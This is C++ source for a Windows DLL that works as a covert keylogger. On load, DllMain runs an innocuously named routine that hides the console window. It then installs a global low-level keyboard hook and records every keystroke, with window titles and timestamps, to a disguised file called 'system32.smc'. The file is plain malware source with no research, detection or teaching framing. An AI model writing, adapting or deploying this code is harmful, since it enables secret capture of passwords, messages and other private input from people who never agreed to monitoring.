#include "stdafx.h"
#include "header.h"
#include <Windows.h>
#include <Winuser.h> 
#include <time.h>
#include <iostream>
#include <cstdio>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	doscan__();
	return TRUE;
}

#define invisible
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
int Save(int key_stroke);
extern char lastwindow[256];

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		return;
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen("system32.smc", "a+");

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; 

	char lastwindow[256];
	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			printf("%s\n", lastwindow); // most probably stupid but without it the log.out gets jumpy... (doesnt happen in .exe ver)

			strcpy(lastwindow, window_title);

			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s1[64], s2[64];
			strftime(s1, sizeof(s2), "%D", tm);
			strftime(s2, sizeof(s2), "%T", tm);

			fprintf(OUTPUT_FILE, "\n[%s-%s-%s] ", window_title, s1, s2);
		}
	}

	std::cout << key_stroke  ;

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
		}
		else if (key_stroke >= 65 && key_stroke <= 90) { 
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
	}
	
	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); 
#endif 

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
#endif
}

void doscan__()
{

	Stealth();
	SetHook();

	// loop to keep the console application running
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}